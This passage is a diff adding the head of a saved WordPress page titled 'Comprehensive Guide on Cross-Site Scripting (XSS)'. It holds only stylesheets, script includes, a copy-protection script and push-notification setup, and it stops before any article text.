@@ -1,0 +1,1790 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Comprehensive Guide on Cross-Site Scripting (XSS)</title>
+<meta name="robots" content="noindex, nofollow">
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<link rel="dns-prefetch" href="http://use.fontawesome.com">
+<link rel="dns-prefetch" href="http://fonts.googleapis.com">
+<link rel="alternate" type="application/rss+xml" title=" &raquo; Feed" href="../../../../feed/index.html">
+<script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"..\/..\/..\/..\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel="stylesheet" id="wp-block-library-css" href="../../../../wp-includes/css/dist/block-library/style.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="my-custom-block-frontend-css-css" href="../../../../wp-content/plugins/wpdm-gutenberg-blocks/build/style.css?ver=6.7.1" media="all">
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="wpdm-font-awesome-css" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="wpdm-front-bootstrap-css" href="../../../../wp-content/plugins/download-manager/assets/bootstrap/css/bootstrap.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="wpdm-front-css" href="../../../../wp-content/plugins/download-manager/assets/css/front.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="Rich_Web_Tabs-css" href="../../../../wp-content/plugins/tabbed//Style/Tabs-Rich-Web-Widget.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="rwtabs_fontawesome-css-css" href="../../../../wp-content/plugins/tabbed//Style/richwebicons.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="wpdmpp-front-css" href="../../../../wp-content/plugins/wpdm-premium-packages/assets/css/wpdmpp.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="wordpress-popular-posts-css-css" href="../../../../wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=6.4.0" media="all">
+<link rel="stylesheet" id="phnewsfeed-style-css" href="../../../../wp-content/themes/ph-news-feed/style.css?ver=1.0.1.1" media="all">
+<link rel="stylesheet" id="bootstrap-css" href="../../../../wp-content/themes/ph-news-feed/lib/bootstrap/bootstrap.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="fontawesome-css" href="../../../../wp-content/themes/ph-news-feed/lib/font-awesome/css/all.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="acme-ticker-css-css" href="../../../../wp-content/themes/ph-news-feed/lib/acmeticker/css/style.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="owl-carousel-css-css" href="../../../../wp-content/themes/ph-news-feed/lib/owl-carousel/dist/assets/owl.carousel.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="owl-carousel-theme-css-css" href="../../../../wp-content/themes/ph-news-feed/lib/owl-carousel/dist/assets/owl.theme.default.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="sidr-dark-css-css" href="../../../../wp-content/themes/ph-news-feed/lib/sidr/stylesheets/jquery.sidr.dark.min.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-primary-font-css" href="http://fonts.googleapis.com/css2?family=Quicksand%3Awght%40100%3B200%3B300%3B400%3B500%3B600%3B700%3B900&amp;display=swap&amp;ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-secondary-font-css" href="http://fonts.googleapis.com/css2?family=Oswald%3Awght%40300%3B400%3B500%3B600%3B700&amp;display=swap&amp;ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-core-css" href="../../../../wp-content/themes/ph-news-feed/design-files/core/core.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-header-css" href="../../../../wp-content/themes/ph-news-feed/design-files/header/style2/header.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-blog-style1-css" href="../../../../wp-content/themes/ph-news-feed/design-files/blog-style/blog-style1.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-single-css" href="../../../../wp-content/themes/ph-news-feed/design-files/single/single.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-sidebar-css" href="../../../../wp-content/themes/ph-news-feed/design-files/sidebar/sidebar.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-footer-css" href="../../../../wp-content/themes/ph-news-feed/design-files/footer/footer.css?ver=6.7.1" media="all">
+<link rel="stylesheet" id="phnewsfeed-featured-modules-css" href="../../../../wp-content/themes/ph-news-feed/design-files/featured-modules/featured-modules.css?ver=6.7.1" media="all">
+<style id="posts-table-pro-head-inline-css">
+.posts-data-table { visibility: hidden; }
+</style>
+<script src="../../../../wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="../../../../wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="../../../../wp-includes/js/jquery/jquery.form.min.js?ver=4.3.0" id="jquery-form-js"></script>
+<script src="../../../../wp-content/plugins/download-manager/assets/bootstrap/js/bootstrap.bundle.min.js?ver=6.7.1" id="wpdm-front-bootstrap-js"></script>
+<script id="wpdm-frontjs-js-extra">
+var wpdm_url = {"home":"..\/..\/..\/..\/index.html","site":"..\/..\/..\/..\/index.html","ajax":"..\/..\/..\/..\/wp-admin\/admin-ajax.php"};
+var wpdm_js = {"spinner":"<i class=\"fas fa-sun fa-spin\"><\/i>"};
+</script>
+<script src="../../../../wp-content/plugins/download-manager/assets/js/front.js?ver=6.1.0" id="wpdm-frontjs-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.3" id="jquery-ui-mouse-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/resizable.min.js?ver=1.13.3" id="jquery-ui-resizable-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect.min.js?ver=1.13.3" id="jquery-effects-core-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-blind.min.js?ver=1.13.3" id="jquery-effects-blind-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-bounce.min.js?ver=1.13.3" id="jquery-effects-bounce-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-clip.min.js?ver=1.13.3" id="jquery-effects-clip-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-drop.min.js?ver=1.13.3" id="jquery-effects-drop-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-explode.min.js?ver=1.13.3" id="jquery-effects-explode-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-fade.min.js?ver=1.13.3" id="jquery-effects-fade-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-fold.min.js?ver=1.13.3" id="jquery-effects-fold-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-highlight.min.js?ver=1.13.3" id="jquery-effects-highlight-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-pulsate.min.js?ver=1.13.3" id="jquery-effects-pulsate-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-size.min.js?ver=1.13.3" id="jquery-effects-size-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-scale.min.js?ver=1.13.3" id="jquery-effects-scale-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-shake.min.js?ver=1.13.3" id="jquery-effects-shake-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-slide.min.js?ver=1.13.3" id="jquery-effects-slide-js"></script>
+<script src="../../../../wp-includes/js/jquery/ui/effect-puff.min.js?ver=1.13.3" id="jquery-effects-puff-js"></script>
+<script id="Rich_Web_Tabs-js-extra">
+var rwtabs_object = {"ajaxurl":"..\/..\/..\/..\/wp-admin\/admin-ajax.php"};
+</script>
+<script src="../../../../wp-content/plugins/tabbed//Scripts/Tabs-Rich-Web-Widget.js?ver=6.7.1" id="Rich_Web_Tabs-js"></script>
+<script src="../../../../wp-content/plugins/wpdm-premium-packages/assets/js/wpdmpp-front.js?ver=6.7.1" id="wpdm-pp-js-js"></script>
+<script id="wpp-json" type="application/json">
+{"sampling_active":0,"sampling_rate":100,"ajax_url":"..\/..\/..\/..\/wp-json\/wordpress-popular-posts\/v1\/popular-posts\/index.html","api_url":"..\/..\/..\/..\/wp-json\/wordpress-popular-posts\/index.html","ID":9053,"token":"ca57abfe37","lang":0,"debug":0}
+</script>
+<script src="../../../../wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=6.4.0" id="wpp-js-js"></script>
+<link rel="https://api.w.org/" href="../../../../wp-json/index.html"><link rel="alternate" title="JSON" type="application/json" href="../../../../wp-json/wp/v2/posts/9053/index.html"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../../xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.7.1">
+<link rel="canonical" href="">
+<link rel="shortlink" href="../../../../index.html?p=9053">
+		<script type="text/javascript">
+			//<![CDATA[
+			var show_msg = '';
+			if (show_msg !== '0') {
+				var options = {view_src: "View Source is disabled!", inspect_elem: "Inspect Element is disabled!", right_click: "Right click is disabled!", copy_cut_paste_content: "Cut/Copy/Paste is disabled!", image_drop: "Image Drag-n-Drop is disabled!" }
+			} else {
+				var options = '';
+			}
+
+         	function nocontextmenu(e) { return false; }
+         	document.oncontextmenu = nocontextmenu;
+         	document.ondragstart = function() { return false;}
+
+			document.onmousedown = function (event) {
+				event = (event || window.event);
+				if (event.keyCode === 123) {
+					if (show_msg !== '0') {show_toast('inspect_elem');}
+					return false;
+				}
+			}
+			document.onkeydown = function (event) {
+				event = (event || window.event);
+				//alert(event.keyCode);   return false;
+				if (event.keyCode === 123 ||
+						event.ctrlKey && event.shiftKey && event.keyCode === 73 ||
+						event.ctrlKey && event.shiftKey && event.keyCode === 75) {
+					if (show_msg !== '0') {show_toast('inspect_elem');}
+					return false;
+				}
+				if (event.ctrlKey && event.keyCode === 85) {
+					if (show_msg !== '0') {show_toast('view_src');}
+					return false;
+				}
+			}
+			function addMultiEventListener(element, eventNames, listener) {
+				var events = eventNames.split(' ');
+				for (var i = 0, iLen = events.length; i < iLen; i++) {
+					element.addEventListener(events[i], function (e) {
+						e.preventDefault();
+						if (show_msg !== '0') {
+							show_toast(listener);
+						}
+					});
+				}
+			}
+			addMultiEventListener(document, 'contextmenu', 'right_click');
+			addMultiEventListener(document, 'cut copy paste print', 'copy_cut_paste_content');
+			addMultiEventListener(document, 'drag drop', 'image_drop');
+			function show_toast(text) {
+				var x = document.getElementById("amm_drcfw_toast_msg");
+				x.innerHTML = eval('options.' + text);
+				x.className = "show";
+				setTimeout(function () {
+					x.className = x.className.replace("show", "")
+				}, 3000);
+			}
+		//]]>
+		</script>
+		<style type="text/css">body * :not(input):not(textarea){user-select:none !important; -webkit-touch-callout: none !important;  -webkit-user-select: none !important; -moz-user-select:none !important; -khtml-user-select:none !important; -ms-user-select: none !important;}#amm_drcfw_toast_msg{visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:999;left:50%;bottom:30px;font-size:17px}#amm_drcfw_toast_msg.show{visibility:visible;-webkit-animation:fadein .5s,fadeout .5s 2.5s;animation:fadein .5s,fadeout .5s 2.5s}@-webkit-keyframes fadein{from{bottom:0;opacity:0}to{bottom:30px;opacity:1}}@keyframes fadein{from{bottom:0;opacity:0}to{bottom:30px;opacity:1}}@-webkit-keyframes fadeout{from{bottom:30px;opacity:1}to{bottom:0;opacity:0}}@keyframes fadeout{from{bottom:30px;opacity:1}to{bottom:0;opacity:0}}</style>
+		<style>/* CSS added by WP Meta and Date Remover*/.wp-block-post-author__name{display:none !important;}
+.wp-block-post-date{display:none !important;}
+ .entry-meta {display:none !important;}
+	.home .entry-meta { display: none; }
+	.entry-footer {display:none !important;}
+	.home .entry-footer { display: none; }</style>    <script>
+        var wpdmpp_base_url = '../../../../wp-content/plugins/wpdm-premium-packages/index.html';
+        var wpdmpp_currency_sign = '$';
+        var wpdmpp_csign_before = '$';
+        var wpdmpp_csign_after = '';
+        var wpdmpp_currency_code = 'USD';
+        var wpdmpp_cart_url = '<br />
+<b>Warning:  Trying to access array offset on value of type bool in <b>C:\xampp\htdocs\wp-content\plugins\wpdm-premium-packages\includes\libs\functions.php on line <b>412<br />
+';
+
+        var wpdmpp_txt = {"cart_button_label":"<i class=\"fas fa-shopping-basket mr-2\"><\/i>Add To Cart","pay_now":"Complete Purchase","checkout_button_label":"Complete Purchase"};
+
+    </script>
+    <style>p.wpdmpp-notice {
+            margin: 5px;
+        }
+    .wpbtn-success {
+        color: var(--color-success) !important;border-color: var(--color-success ) !important;
+        background: rgba(var(--color-success-rgb),0.03) !important;
+        transition: all ease-in-out 300ms;
+    }
+        .wpbtn-success:active,
+        .wpbtn-success:hover {
+            color: var(--color-success-active) !important;
+            border-color: var(--color-success-active) !important;
+            background: rgba(var(--color-success-rgb),0.07) !important;
+        }
+    </style>
+                <style id="wpp-loading-animation-styles">@-webkit-keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}@keyframes bgslide{from{background-position-x:0}to{background-position-x:-200%}}.wpp-widget-placeholder,.wpp-widget-block-placeholder,.wpp-shortcode-placeholder{margin:0 auto;width:60px;height:3px;background:#dd3737;background:linear-gradient(90deg,#dd3737 0%,#571313 10%,#dd3737 100%);background-size:200% auto;border-radius:3px;-webkit-animation:bgslide 1s infinite linear;animation:bgslide 1s infinite linear}</style>
+             <style>
+ 	:root {
+		 --phnewsfeed-primary: #fff7f7;
+		 --phnewsfeed-primary-text: #b20000;
+		 --phnewsfeed-background-main: #dd3333;
+		 --phnewsfeed-background-darker: #dd3333;
+		 
+		 --phnewsfeed-secondary: #000000;
+		 --phnewsfeed-secondary-text: #00b282;
+		 --phnewsfeed-secondary-dark: #000000;
+		 
+		 --phnewsfeed-text-dark: #eded07;
+		 --phnewsfeed-text: #555;
+		 --phnewsfeed-text-light: #000000;
+		 
+		 --phnewsfeed-header-background: #ffffff;
+		 --phnewsfeed-header-text: #ffffff;
+		 --phnewsfeed-header-lighter: #ffffff;
+		 --phnewsfeed-top-bar-text: #777777;
+		 
+		 --phnewsfeed-mobile-header-background: #000000;
+		 --phnewsfeed-mobile-header-text: #222222;
+	 }
+ </style>
+ <style>
+	 #masthead #site-branding .custom-logo {
+		 max-height: 30px !important;
+	 }
+ </style>
+      <meta name="onesignal" content="wordpress-plugin">
+            <script>
+
+      window.OneSignal = window.OneSignal || [];
+
+      OneSignal.push( function() {
+        OneSignal.SERVICE_WORKER_UPDATER_PATH = 'OneSignalSDKUpdaterWorker.js';
+                      OneSignal.SERVICE_WORKER_PATH = 'OneSignalSDKWorker.js';
+                      OneSignal.SERVICE_WORKER_PARAM = { scope: '/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/push/onesignal/' };
+        OneSignal.setDefaultNotificationUrl("../../../../index.html");
+        var oneSignal_options = {};
+        window._oneSignalInitOptions = oneSignal_options;
+
+        oneSignal_options['wordpress'] = true;
+oneSignal_options['appId'] = '';
+oneSignal_options['allowLocalhostAsSecureOrigin'] = true;
+oneSignal_options['httpPermissionRequest'] = { };
+oneSignal_options['httpPermissionRequest']['enable'] = true;
+oneSignal_options['welcomeNotification'] = { };
+oneSignal_options['welcomeNotification']['title'] = "";
+oneSignal_options['welcomeNotification']['message'] = "";
+oneSignal_options['path'] = "../../../../wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/index.html";
+oneSignal_options['promptOptions'] = { };
+oneSignal_options['notifyButton'] = { };
+oneSignal_options['notifyButton']['enable'] = true;
+oneSignal_options['notifyButton']['position'] = 'bottom-right';
+oneSignal_options['notifyButton']['theme'] = 'default';
+oneSignal_options['notifyButton']['size'] = 'medium';
+oneSignal_options['notifyButton']['showCredit'] = true;
+oneSignal_options['notifyButton']['text'] = {};
+                OneSignal.init(window._oneSignalInitOptions);
+                      });
+
+      function documentInitOneSignal() {
+        var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");
+
+        var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
+          oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
+      }
+
+      if (document.readyState === 'complete') {
+           documentInitOneSignal();
+      }
+      else {
+           window.addEventListener("load", function(event){
+               documentInitOneSignal();
+          });
+      }
+    </script>
+	<style type="text/css">
+			#masthead {
+			background: url(../../../../wp-content/uploads/2024/12/3-2.png);
+			background-size: cover;
+		}
+			.site-title,
+		.site-description {
